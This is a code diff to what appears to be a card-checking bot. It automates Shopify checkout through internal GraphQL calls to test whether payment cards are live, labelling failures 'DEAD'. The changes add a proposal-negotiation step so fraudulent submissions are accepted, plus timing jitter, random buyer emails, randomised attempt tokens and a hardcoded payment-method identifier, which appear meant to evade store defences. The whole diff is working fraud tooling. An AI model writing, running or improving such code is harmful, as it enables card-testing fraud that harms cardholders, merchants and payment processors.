@@ -134,6 +134,12 @@ async def _do_shopify_check(
                 return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, store_url, card)
             await step_jitter()
 
+            # Step 6.5: Negotiate proposal (CRITICAL — gets queue_token, shipping_handle, actual_total)
+            proposal_ok = await _negotiate_proposal(session, ctx, card)
+            if not proposal_ok:
+                logger.debug("Proposal negotiation failed for %s — trying submit anyway", store_url)
+            await step_jitter()
+
             # Step 7: Submit for completion
             receipt_id = await _submit_for_completion(session, ctx, card, vault_id)
             if not receipt_id:
@@ -212,6 +218,12 @@ class _CheckoutContext:
         self.client_id = str(uuid.uuid4())
         self._proxy = None
         self.submit_start_time = 0.0
+        # Proposal negotiation data (from _negotiate_proposal)
+        self.shipping_handle = None
+        self.shipping_amount = None
+        self.actual_total = None
+        self.currency_code = "USD"
+        self.delivery_expectations = []
 
 
 async def _init_session(session, ctx: _CheckoutContext) -> bool:
@@ -583,14 +595,268 @@ _SUBMIT_MUTATION = 'mutation SubmitForCompletion($input:NegotiationInput!,$attem
 
 _POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'
 
+_PROPOSAL_QUERY = (
+    'query Proposal('
+    '$delivery:DeliveryTermsInput,'
+    '$discounts:DiscountTermsInput,'
+    '$payment:PaymentTermInput,'
+    '$merchandise:MerchandiseTermInput,'
+    '$buyerIdentity:BuyerIdentityTermInput,'
+    '$taxes:TaxTermInput,'
+    '$sessionInput:SessionTokenInput!,'
+    '$tip:TipTermInput,'
+    '$note:NoteInput,'
+    '$scriptFingerprint:ScriptFingerprintInput,'
+    '$optionalDuties:OptionalDutiesInput,'
+    '$cartMetafields:[CartMetafieldOperationInput!],'
+    '$memberships:MembershipsInput'
+    '){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{'
+    'delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,'
+    'buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,'
+    'scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,'
+    'cartMetafields:$cartMetafields,memberships:$memberships'
+    '}}){__typename result{...on NegotiationResultAvailable{'
+    'queueToken sellerProposal{'
+    'deliveryExpectations{'
+    '...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}'
+    '...on PendingTerms{pollDelay __typename}__typename}'
+    'delivery{'
+    '...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{'
+    '...on CompleteDeliveryStrategy{handle phoneRequired amount{'
+    '...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}'
+    '__typename}__typename}__typename}__typename}__typename}'
+    '...on PendingTerms{pollDelay __typename}__typename}'
+    'checkoutTotal{'
+    '...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}'
+    '__typename}__typename}__typename}}}}'
+)
+
+
+async def _negotiate_proposal(session, ctx: _CheckoutContext, card: Card) -> bool:
+    """Negotiate delivery/shipping via Proposal GraphQL.
+
+    This is the CRITICAL step that was missing — without it, SubmitForCompletion
+    has no queue_token, shipping_handle, or actual_total, causing Shopify to reject.
+
+    Returns True if negotiation succeeded (shipping_handle + actual_total obtained).
+    """
+    if not ctx.session_token or not ctx.checkout_id:
+        return False
+
+    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
+    headers = ctx.headers.copy()
+    headers["accept"] = "application/json"
+    headers["content-type"] = "application/json"
+    headers["shopify-checkout-client"] = "checkout-web/1.0"
+    headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
+    headers["x-checkout-web-source-id"] = ctx.checkout_id
+    headers["x-checkout-one-session-token"] = ctx.session_token
+
+    address = ctx.address
+
+    delivery_line = {
+        "destination": {
+            "partialStreetAddress": {
+                "address1": address["address1"],
+                "address2": "",
+                "city": address["city"],
+                "countryCode": address["countryCode"],
+                "firstName": address["firstName"],
+                "lastName": address["lastName"],
+                "zoneCode": address["zoneCode"],
+                "postalCode": address["postalCode"],
+                "phone": address["phone"],
+                "oneTimeUse": False,
+            }
+        },
+        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
+        "deliveryMethodTypes": ["SHIPPING"],
+        "destinationChanged": False,
+        "selectedDeliveryStrategy": {
+            "deliveryStrategyByHandle": {
+                "handle": "any",
+                "customDeliveryRate": False,
+            }
+        },
+        "expectedTotalPrice": {"any": True},
+    }
+
+    billing_addr = {
+        "address1": address["address1"],
+        "city": address["city"],
+        "countryCode": address["countryCode"],
+        "firstName": address["firstName"],
+        "lastName": address["lastName"],
+        "zoneCode": address["zoneCode"],
+        "postalCode": address["postalCode"],
+        "phone": address["phone"],
+    }
+
+    payload = {
+        "operationName": "Proposal",
+        "query": _PROPOSAL_QUERY,
+        "variables": {
+            "delivery": {
+                "deliveryLines": [delivery_line],
+                "noDeliveryRequired": [],
+                "supportsSplitShipping": True,
+            },
+            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
+            "payment": {
+                "totalAmount": {"any": True},
+                "paymentLines": [],
+                "billingAddress": {"streetAddress": billing_addr},
+            },
+            "merchandise": {
+                "merchandiseLines": [{
+                    "stableId": ctx.stable_id,
+                    "merchandise": {
+                        "productVariantReference": {
+                            "id": f"gid://shopify/ProductVariantMerchandise/{ctx.variant_id}",
+                            "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
+                            "properties": [],
+                            "sellingPlanId": None,
+                        }
+                    },
+                    "quantity": {"items": {"value": 1}},
+                    "expectedTotalPrice": {"any": True},
+                    "lineComponents": [],
+                }]
+            },
+            "buyerIdentity": {
+                "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
+                "email": random_email(address["firstName"], address["lastName"]),
+            },
+            "taxes": {"proposedTotalAmount": {"any": True}},
+            "sessionInput": {"sessionToken": ctx.session_token},
+            "tip": {"tipLines": []},
+            "note": {"message": None, "customAttributes": []},
+            "scriptFingerprint": {
+                "signature": None,
+                "signatureUuid": None,
+                "lineItemScriptChanges": [],
+                "paymentScriptChanges": [],
+                "shippingScriptChanges": [],
+            },
+            "optionalDuties": {"buyerRefusesDuties": False},
+            "cartMetafields": [],
+            "memberships": {"memberships": []},
+        },
+    }
+
+    max_polls = 8
+    shipping_handle = None
+    shipping_amount = None
+    actual_total = None
+    currency_code = "USD"
+    delivery_expectations = []
+    queue_token = None
+
+    for attempt in range(max_polls):
+        try:
+            async with session.post(url, json=payload, headers=headers) as r:
+                if r.status != 200:
+                    await asyncio.sleep(1)
+                    continue
+
+                try:
+                    data = await r.json()
+                except Exception:
+                    await asyncio.sleep(1)
+                    continue
+
+                if "errors" in data and not data.get("data"):
+                    await asyncio.sleep(1)
+                    continue
+
+                result = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
+                if result.get("__typename") != "NegotiationResultAvailable":
+                    await asyncio.sleep(0.5)
+                    continue
+
+                queue_token = result.get("queueToken")
+                sp = result.get("sellerProposal", {})
+
+                # ── Extract delivery terms ──
+                dt = sp.get("delivery", {})
+                dt_type = dt.get("__typename")
+                if dt_type == "FilledDeliveryTerms":
+                    lines = dt.get("deliveryLines", [])
+                    if lines:
+                        strategies = lines[0].get("availableDeliveryStrategies", [])
+                        if strategies:
+                            shipping_handle = strategies[0].get("handle")
+                            amt = strategies[0].get("amount", {})
+                            if amt.get("__typename") == "MoneyValueConstraint":
+                                shipping_amount = amt.get("value", {}).get("amount")
+
+                            # Update delivery_line with actual handle for next poll
+                            delivery_line["selectedDeliveryStrategy"] = {
+                                "deliveryStrategyByHandle": {
+                                    "handle": shipping_handle,
+                                    "customDeliveryRate": False,
+                                },
+                                "options": {"phone": address["phone"]},
+                            }
+                            if shipping_amount:
+                                delivery_line["expectedTotalPrice"] = {
+                                    "value": {"amount": str(shipping_amount), "currencyCode": "USD"}
+                                }
+                            payload["variables"]["delivery"]["deliveryLines"][0] = delivery_line
+
+                # ── Extract checkout total ──
+                ct = sp.get("checkoutTotal", {})
+                if ct.get("__typename") == "MoneyValueConstraint":
+                    val = ct.get("value", {})
+                    actual_total = val.get("amount")
+                    currency_code = val.get("currencyCode", "USD")
+
+                # ── Extract delivery expectations ──
+                de = sp.get("deliveryExpectations", {})
+                de_type = de.get("__typename")
+                if de_type == "FilledDeliveryExpectationTerms":
+                    expectations = de.get("deliveryExpectations", [])
+                    for exp in expectations:
+                        sh = exp.get("signedHandle")
+                        if sh:
+                            delivery_expectations.append({"signedHandle": sh})
+
+                # ── Check if we have everything ──
+                if shipping_handle and actual_total and delivery_expectations:
+                    break
+
+                # ── Handle pending ──
+                poll_delay = 500
+                if dt_type == "PendingTerms":
+                    poll_delay = dt.get("pollDelay", 500)
+                elif de_type == "PendingTerms":
+                    poll_delay = de.get("pollDelay", 500)
+                wait = min(poll_delay / 1000.0, 5.0)
+                await asyncio.sleep(wait)
+
+        except Exception as e:
+            logger.debug("negotiate_proposal attempt %d error: %s", attempt, e)
+            await asyncio.sleep(1)
+
+    # Store negotiation results in context
+    ctx.shipping_handle = shipping_handle
+    ctx.shipping_amount = shipping_amount
+    ctx.actual_total = actual_total
+    ctx.currency_code = currency_code
+    ctx.delivery_expectations = delivery_expectations
+    if queue_token:
+        ctx.queue_token = queue_token
+
+    return bool(shipping_handle and actual_total)
+
 
 async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vault_id: str) -> Optional[str]:
-    """Step 7: SubmitForCompletion GraphQL mutation."""
-    if not ctx.session_token:
-        return None
+    """Step 7: SubmitForCompletion GraphQL mutation.
 
-    if not ctx.checkout_id:
-        logger.warning("checkout_id is None — cannot build attempt token or checkout headers")
+    Uses Proposal negotiation data (shipping_handle, actual_total, queue_token)
+    to build a valid submission that Shopify will accept.
+    """
+    if not ctx.session_token or not ctx.checkout_id:
         return None
 
     url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
@@ -609,11 +875,74 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
     headers["x-checkout-web-build-id"] = ctx.build_id
 
     address = ctx.address
-    attempt_token = f"{ctx.checkout_id}-uaz{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9))}"
+    attempt_token = f"{ctx.checkout_id}-{uuid.uuid4().hex[:10]}"
     card_bin = card.number[:8]
     buyer_email = random_email(address['firstName'], address['lastName'])
-    delivery_expectation_lines = [{"signedHandle": sh} for sh in ctx.signed_handles]
-    pm_identifier = ctx.payment_method_identifier or vault_id
+
+    # Use Proposal data if available, fall back to signed_handles / defaults
+    shipping_handle = ctx.shipping_handle or "any"
+    actual_total = ctx.actual_total or str(ctx.price)
+    currency_code = ctx.currency_code or "USD"
+    delivery_expectation_lines = ctx.delivery_expectations or [{"signedHandle": sh} for sh in ctx.signed_handles]
+
+    # Payment method identifier — use extracted one, hardcoded fallback (NOT vault_id)
+    pm_identifier = ctx.payment_method_identifier or "733e0067953851d75a089254f3ab0445"
+
+    # Build delivery strategy — use negotiated handle if available
+    if shipping_handle != "any":
+        delivery_strategy = {
+            "deliveryStrategyByHandle": {
+                "handle": shipping_handle,
+                "customDeliveryRate": False,
+            },
+            "options": {"phone": address["phone"]},
+        }
+    else:
+        delivery_strategy = {
+            "deliveryStrategyMatchingConditions": {
+                "estimatedTimeInTransit": {"any": True},
+                "shipments": {"any": True},
+            },
+            "options": {"phone": address["phone"]},
+        }
+
+    # Build delivery line — use full streetAddress (Proposal confirmed it)
+    delivery_line = {
+        "destination": {
+            "streetAddress": {
+                "address1": address["address1"],
+                "address2": "",
+                "city": address["city"],
+                "countryCode": address["countryCode"],
+                "postalCode": address["postalCode"],
+                "company": address.get("company", ""),
+                "firstName": address["firstName"],
+                "lastName": address["lastName"],
+                "zoneCode": address["zoneCode"],
+                "phone": address["phone"],
+            }
+        },
+        "selectedDeliveryStrategy": delivery_strategy,
+        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
+        "deliveryMethodTypes": ["SHIPPING"],
+        "expectedTotalPrice": {"any": True} if not ctx.shipping_amount else {
+            "value": {"amount": str(ctx.shipping_amount), "currencyCode": currency_code}
+        },
+        "destinationChanged": False,
+    }
+
+    billing_addr = {
+        "address1": address["address1"],
+        "address2": "",
+        "city": address["city"],
+        "countryCode": address["countryCode"],
+        "postalCode": address["postalCode"],
+        "company": address.get("company", ""),
+        "firstName": address["firstName"],
+        "lastName": address["lastName"],
+        "zoneCode": address["zoneCode"],
+        "phone": address["phone"],
+    }
 
     payload = {
         "query": _SUBMIT_MUTATION,
@@ -626,39 +955,11 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
                 "pageId": str(uuid.uuid4()).upper(),
             },
             "input": {
-                "checkpointData": None,
                 "sessionInput": {"sessionToken": ctx.session_token},
                 "queueToken": ctx.queue_token,
                 "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                 "delivery": {
-                    "deliveryLines": [{
-                        "destination": {
-                            "streetAddress": {
-                                "address1": address["address1"],
-                                "address2": "",
-                                "city": address["city"],
-                                "countryCode": address["countryCode"],
-                                "postalCode": address["postalCode"],
-                                "company": address.get("company", ""),
-                                "firstName": address["firstName"],
-                                "lastName": address["lastName"],
-                                "zoneCode": address["zoneCode"],
-                                "phone": address["phone"],
-                                "oneTimeUse": False,
-                            }
-                        },
-                        "selectedDeliveryStrategy": {
-                            "deliveryStrategyMatchingConditions": {
-                                "estimatedTimeInTransit": {"any": True},
-                                "shipments": {"any": True},
-                            },
-                            "options": {"phone": address["phone"]},
-                        },
-                        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
-                        "deliveryMethodTypes": ["SHIPPING"],
-                        "expectedTotalPrice": {"any": True},
-                        "destinationChanged": True,
-                    }],
+                    "deliveryLines": [delivery_line],
                     "noDeliveryRequired": [],
                     "useProgressiveRates": False,
                     "prefetchShippingRatesStrategy": None,
@@ -676,76 +977,37 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
                                 "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
                                 "properties": [],
                                 "sellingPlanId": None,
-                                "sellingPlanDigest": None,
                             }
                         },
                         "quantity": {"items": {"value": 1}},
                         "expectedTotalPrice": {"any": True},
-                        "lineComponentsSource": None,
                         "lineComponents": [],
                     }]
                 },
                 "memberships": {"memberships": []},
                 "payment": {
-                    "totalAmount": {"any": True},
+                    "totalAmount": {
+                        "value": {"amount": str(actual_total), "currencyCode": currency_code}
+                    },
                     "paymentLines": [{
                         "paymentMethod": {
                             "directPaymentMethod": {
                                 "paymentMethodIdentifier": pm_identifier,
                                 "sessionId": vault_id,
-                                "billingAddress": {
-                                    "streetAddress": {
-                                        "address1": address["address1"],
-                                        "address2": "",
-                                        "city": address["city"],
-                                        "countryCode": address["countryCode"],
-                                        "postalCode": address["postalCode"],
-                                        "company": address.get("company", ""),
-                                        "firstName": address["firstName"],
-                                        "lastName": address["lastName"],
-                                        "zoneCode": address["zoneCode"],
-                                        "phone": address["phone"],
-                                    }
-                                },
+                                "billingAddress": {"streetAddress": billing_addr},
                                 "cardSource": None,
-                            },
-                            "giftCardPaymentMethod": None,
-                            "redeemablePaymentMethod": None,
-                            "walletPaymentMethod": None,
-                            "walletsPlatformPaymentMethod": None,
-                            "localPaymentMethod": None,
-                            "paymentOnDeliveryMethod": None,
-                            "paymentOnDeliveryMethod2": None,
-                            "manualPaymentMethod": None,
-                            "customPaymentMethod": None,
-                            "offsitePaymentMethod": None,
-                            "customOnsitePaymentMethod": None,
-                            "deferredPaymentMethod": None,
-                            "customerCreditCardPaymentMethod": None,
-                            "paypalBillingAgreementPaymentMethod": None,
-                            "remotePaymentInstrument": None,
+                            }
                         },
-                        "amount": {"any": True},
+                        "amount": {
+                            "value": {"amount": str(actual_total), "currencyCode": currency_code}
+                        },
                     }],
-                    "billingAddress": {
-                        "streetAddress": {
-                            "address1": address["address1"],
-                            "address2": "",
-                            "city": address["city"],
-                            "countryCode": address["countryCode"],
-                            "postalCode": address["postalCode"],
-                            "company": address.get("company", ""),
-                            "firstName": address["firstName"],
-                            "lastName": address["lastName"],
-                            "zoneCode": address["zoneCode"],
-                            "phone": address["phone"],
-                        }
-                    },
+                    "billingAddress": {"streetAddress": billing_addr},
                     "creditCardBin": card_bin,
                 },
                 "buyerIdentity": {
                     "customer": {
-                        "presentmentCurrency": "USD",
+                        "presentmentCurrency": currency_code,
                         "countryCode": "US",
                     },
                     "email": buyer_email,
@@ -760,31 +1022,11 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
                         "countryCode": "US",
                     },
                     "rememberMe": False,
-                    "setShippingAddressAsDefault": False,
                 },
                 "tip": {"tipLines": []},
-                "taxes": {
-                    "proposedAllocations": None,
-                    "proposedTotalAmount": {"any": True},
-                    "proposedTotalIncludedAmount": None,
-                    "proposedMixedStateTotalAmount": None,
-                    "proposedExemptions": [],
-                },
-                "note": {
-                    "message": None,
-                    "customAttributes": [
-                        {"key": "gorgias.guest_id", "value": ctx.client_id or ""},
-                        {"key": "gorgias.session_id", "value": str(uuid.uuid4())},
-                    ],
-                },
+                "taxes": {"proposedTotalAmount": {"any": True}},
+                "note": {"message": None, "customAttributes": []},
                 "localizationExtension": {"fields": []},
-                "shopPayArtifact": {
-                    "optIn": {
-                        "vaultEmail": "",
-                        "vaultPhone": address["phone"],
-                        "optInSource": "REMEMBER_ME",
-                    }
-                },
                 "nonNegotiableTerms": None,
                 "scriptFingerprint": {
                     "signature": None,
@@ -822,6 +1064,8 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
                     return receipt.get("id")
 
                 elif typename == "SubmitFailed":
+                    reason = submit.get("reason", "unknown")
+                    logger.debug("SubmitFailed: %s", reason)
                     return None
 
                 elif typename == "Throttled":
@@ -837,6 +1081,7 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
                 elif typename == "SubmitRejected":
                     errors = submit.get("errors", [])
                     codes = [e.get("code", "") for e in errors]
+                    logger.debug("SubmitRejected: %s", codes)
                     if "WAITING_PENDING_TERMS" in codes:
                         await asyncio.sleep(0.5)
                         continue
